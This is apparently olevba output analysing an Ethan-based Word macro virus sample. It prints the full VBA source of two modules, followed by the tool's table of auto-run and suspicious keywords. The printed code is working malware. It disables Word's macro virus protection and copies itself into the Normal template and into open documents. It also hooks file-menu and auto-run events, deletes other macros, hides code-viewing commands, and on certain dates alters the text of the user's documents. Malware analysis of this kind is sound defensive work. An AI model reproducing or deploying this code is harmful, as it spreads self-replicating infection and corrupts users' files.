olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ethan-based-ee7ed1f534b942c4cafbfb556be9533a3fd95d0c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ethan-based-ee7ed1f534b942c4cafbfb556be9533a3fd95d0c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next
s = ActiveDocument.Saved
Application.EnableCancelKey = Not -1
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
Randomize
If Dir("c:\ethan.___", 6) = "" Then
Open "c:\ethan.___" For Output As #1
For i = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
a = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
Print #1, a
Next i
Close #1
SetAttr "c:\ethan.___", 6
End If
If Dir("c:\class.sys") <> "" Then Kill "c:\class.sys"
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
Set t = NormalTemplate.VBProject.VBComponents.Item(1)
ElseIf ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
Set t = ActiveDocument.VBProject.VBComponents.Item(1)
Else
t = ""
End If
If t <> "" Then
Open "c:\ethan.___" For Input As #1
If LOF(1) = 0 Then GoTo q
i = 1
Do While Not EOF(1)
Line Input #1, a
t.CodeModule.InsertLines i, a
i = i + 1
Loop
q:
Close #1
If Rnd < 0.3 Then With Dialogs(wdDialogFileSummaryInfo): .Title = "Ethan Frome": .Author = "EW/LN/CB": .Keywords = "Ethan": .Execute: End With
If Left(ActiveDocument.Name, 8) <> "Document" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If
If ActiveDocument.Saved <> s Then ActiveDocument.Saved = s
End Sub
-------------------------------------------------------------------------------
VBA MACRO Akrnl.bas 
in file: Virus.MSWord.Ethan-based-ee7ed1f534b942c4cafbfb556be9533a3fd95d0c - OLE stream: 'Macros/VBA/akrnl'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    
Public Skip As Integer
    
    
Sub Akrnl()
On Error Resume Next
Options.ConfirmConversions = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
ActiveDocument.ReadOnlyRecommended = False

If Day(Now()) > 22 Then Call RandomRemplace

End Sub
Sub AutoExec()
    On Error Resume Next
    Call Sauve
End Sub
Sub AutoNew()
 On Error Resume Next
 Call Sauve
End Sub
Sub AutoPrint()
 On Error Resume Next
 Call Sauve
End Sub

Sub FileNew()
    On Error Resume Next
    Call Sauve
Dialogs(wdDialogFileNew).show
    Skip = 1
    Call Sauve
    
End Sub
Sub FileClose()
    On Error Resume Next
    Call Sauve
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    ActiveDocument.Close
    Call Sauve
End Sub
Sub FileExit()
    On Error Resume Next
    Call Sauve
    Application.Quit
End Sub
    

Sub AutoOpen()
    On Error Resume Next
    Call Akrnl
    Call Sauve
    
End Sub
Sub AutoExit()
    On Error Resume Next
    Call Sauve
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Application.Quit
End Sub

Sub AutoClose()
    On Error Resume Next
    Call Sauve
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Call Sauve
End Sub
Sub ToolsMacro()
    On Error Resume Next
    
End Sub
Sub FileTemplates()
    On Error Resume Next
    
End Sub
Sub ViewVBCode()
   On Error Resume Next
   
End Sub

Sub RandomRemplace()
Randomize
ValRandom = Int(Rnd * 75)
    If ValRandom < 20 Then BesoinRemplace = True
    If ValRandom < 20 Then txt = "ainsi, si j'en crois ce que mon incompétant de professeur me dit,"
    If ValRandom < 15 Then txt = "ainsi, mon chat a perdu ses dents. De plus,"
    If ValRandom < 10 Then txt = "ainsi, selon ma grand-mère,"
    If ValRandom < 5 Then txt = "ainsi, la matière du cours est plate. De plus,"
    
    If BesoinRemplace = True Then Call Remplace(txt)
    
    
    
End Sub
    

Sub Remplace(txt)
 
Selection.Find.ClearFormatting
    Selection.Find.Replacement.ClearFormatting
    With Selection.Find
        .Text = "donc,"
        .Replacement.Text = txt
        .Forward = True
        .Format = False
        .MatchCase = False
        .MatchWholeWord = False
        .MatchWildcards = False
        .MatchSoundsLike = False
        .MatchAllWordForms = False
    End With
    Selection.Find.Execute Replace:=wdReplaceOne
    Selection.MoveUp Unit:=wdScreen, Count:=8
    

End Sub

Sub Sauve()

On Error Resume Next
Options.ConfirmConversions = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Application.VBE.ActiveVBProject.VBComponents("akrnl").Export "c:\Étudiant.cfg"
ActiveDocument.ReadOnlyRecommended = False

For i = 1 To ActiveDocument.VBProject.VBComponents.Count
NomMacro = ActiveDocument.VBProject.VBComponents(i).Name
If NomMacro = "akrnl" Then PrésentAct = True Else Call DelVir(NomMacro)
Next i

For i = 1 To NormalTemplate.VBProject.VBComponents.Count
NomMacro = NormalTemplate.VBProject.VBComponents(i).Name
If NomMacro = "akrnl" Then PrésentNorm = True Else Call DelVir(NomMacro)
Next i

If PrésentAct = True And PrésentNorm = False Then Set BesoinSauve = NormalTemplate.VBProject.VBComponents
If PrésentAct = False And PrésentNorm = True Then Set BesoinSauve = ActiveDocument.VBProject.VBComponents

BesoinSauve.Import "c:\Étudiant.cfg"

If PrésentNorm = False Then If NormalTemplate.Saved = False Then NormalTemplate.Save
If PrésentAct = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument

End Sub
Sub DelVir(NomMacro)
On Error Resume Next

Application.VBE.ActiveVBProject.VBComponents.Remove _
                         Application.VBE.ActiveVBProject.VBComponents(NomMacro)
                         
With Application.NormalTemplate.VBProject
             .VBComponents.Remove .VBComponents(NomMacro)
    End With
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

